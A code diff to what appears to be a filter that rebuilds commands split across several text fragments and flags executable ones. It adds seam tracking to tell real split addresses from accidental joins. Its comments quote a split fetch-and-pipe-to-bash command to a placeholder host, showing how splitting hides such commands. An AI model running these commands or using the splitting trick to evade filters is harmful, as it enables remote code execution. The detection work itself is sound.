@@ -4172,10 +4172,10 @@ function stitchedWindowIsDangerous(win: FragmentCandidate[]): boolean {
     !win.some((n) => hasRestoreInstruction(n.content ?? "") && cipherishToken(n.content ?? "")) &&
     win.some((n) => hasRestoreInstruction(n.content ?? "")) &&
     win.some((n) => cipherishToken(n.content ?? ""));
-  for (const stitched of stitchWindow(win)) {
-    const forms = endpointsOf(stitched);
-    if (!forms.some((e) => !own.has(e)) && !restoreSplit) continue;
-    if (noteContainsExecutableCommand(stitched)) return true;
+  for (const st of stitchWindow(win)) {
+    const fresh = endpointsOf(st.text).filter((e) => !own.has(e) && !seamArtifactEndpoint(e, st, endpointsOf));
+    if (fresh.length === 0 && !restoreSplit) continue;
+    if (noteContainsExecutableCommand(st.text)) return true;
   }
   return false;
 }
@@ -4237,7 +4237,26 @@ function fragmentOrders(win: FragmentCandidate[]): FragmentCandidate[][] {
   return out;
 }
 
-function stitchWindow(win: FragmentCandidate[]): string[] {
+interface Stitched {
+  text: string;
+  /** 每个接缝在 text 里的位置（前一片结束 = 后一片开始）。 */
+  seams: number[];
+}
+
+function joinPieces(parts: string[], sep: string): Stitched {
+  const seams: number[] = [];
+  let text = "";
+  parts.forEach((p, i) => {
+    if (i > 0) {
+      text += sep;
+      seams.push(text.length);
+    }
+    text += p;
+  });
+  return { text, seams };
+}
+
+function stitchWindow(win: FragmentCandidate[]): Stitched[] {
   const pieces = win.map((n) => fragmentPiece(n.content));
   const firstPieces = win.map((n) => fragmentPiece(n.content, { firstSep: true }));
   // 「按空格断开」的分片（`wget ` + `-qO- htt`）trim 后会粘成 `wget-qO-`：保留片尾空白再直接相接。
@@ -4247,20 +4266,62 @@ function stitchWindow(win: FragmentCandidate[]): string[] {
   // 片段夹在说明句中间（`把 curl http://relay3.exa 这半句` / `另半句 mple.net/p.sh | bash 拼上去`）：
   // 取每条里最长的代码形态连续段再拼（R310 P1，R309 NC06 实测漏判）。
   const codeRuns = win.map((n) => fragmentCodeRun(n.content));
-  return [
-    ...new Set([
-      pieces.join(""),
-      pieces.join(" "),
-      rawPieces.join(""),
-      firstPieces.join(""),
-      firstPieces.join(" "),
-      rawFirstPieces.join(""),
-      wholes.join(""),
-      wholes.join(" "),
-      codeRuns.join(""),
-      codeRuns.join(" "),
-    ]),
-  ];
+  const out: Stitched[] = [];
+  const seen = new Set<string>();
+  for (const st of [
+    joinPieces(pieces, ""),
+    joinPieces(pieces, " "),
+    joinPieces(rawPieces, ""),
+    joinPieces(firstPieces, ""),
+    joinPieces(firstPieces, " "),
+    joinPieces(rawFirstPieces, ""),
+    joinPieces(wholes, ""),
+    joinPieces(wholes, " "),
+    joinPieces(codeRuns, ""),
+    joinPieces(codeRuns, " "),
+  ]) {
+    if (seen.has(st.text)) continue;
+    seen.add(st.text);
+    out.push(st);
+  }
+  return out;
+}
+
+/**
+ * 拼接后新出现的端点是否只是**接缝伪端点**：直接相接把前一条的尾词与后一条的地址
+ * 粘在一起（`https://example.com` + `curl` → `example.comcurl`；`register` + `3.example.net`），
+ * 而不是把一个被切开的地址拼回去（`https://relay3.exa` + `mple.net/p.sh`）。
+ *  - 主机面非法（含非 ASCII 标签 / 末标签无字母）→ 伪端点；
+ *  - 接缝前半本身以一个完整端点结尾 → 伪端点（前一条自己的地址被后一条的词接长）；
+ *  - 接缝后半以一个完整端点开头，且前半不是悬空的协议地址（`…://xxx` 结尾）→ 伪端点。
+ * 在 text 里找不到该端点（来自拼读/分隔归一面）→ 不是接缝产物，按真实新端点处理。
+ */
+function seamArtifactEndpoint(
+  ep: string,
+  st: Stitched,
+  endpointsOf: (t: string) => string[]
+): boolean {
+  const host = ep.replace(/^[\w.+-]+@/, "").replace(/:\d{2,5}$/, "");
+  const labels = host.split(".");
+  const tail = labels[labels.length - 1] ?? "";
+  if (!/^[A-Za-z0-9-]+$/.test(labels.join("")) ) return true;
+  if (!/^\d{1,3}(?:\.\d{1,3}){3}$/.test(host) && !/[A-Za-z]/.test(tail)) return true;
+  const lower = st.text.toLowerCase();
+  const start = lower.indexOf(ep.toLowerCase());
+  if (start < 0) return false;
+  const end = start + ep.length;
+  for (const seam of st.seams) {
+    if (seam <= start || seam >= end) continue;
+    const aPart = st.text.slice(start, seam);
+    const bPart = st.text.slice(seam, end);
+    const aLower = aPart.toLowerCase();
+    if (endpointsOf(aPart).some((e) => aLower.endsWith(e.toLowerCase()))) return true;
+    const bLower = bPart.toLowerCase();
+    const bOwn = endpointsOf(bPart).some((e) => bLower.startsWith(e.toLowerCase()));
+    const dangling = /:\/\/[A-Za-z0-9.-]*$/.test(st.text.slice(0, seam));
+    if (bOwn && !dangling) return true;
+  }
+  return false;
 }
 
 const CODE_RUN_RE = /[A-Za-z0-9][A-Za-z0-9:\/.|@\-_~%=?&+ ]*[A-Za-z0-9\/.|]/g;
@@ -7590,3 +7651,4 @@ export function sseAnswerChunks(answer: string, minLen = 12, maxLen = 48): strin
   if (buf) out.push(buf);
   return out.length > 0 ? out : answer ? [answer] : [];
 }
+
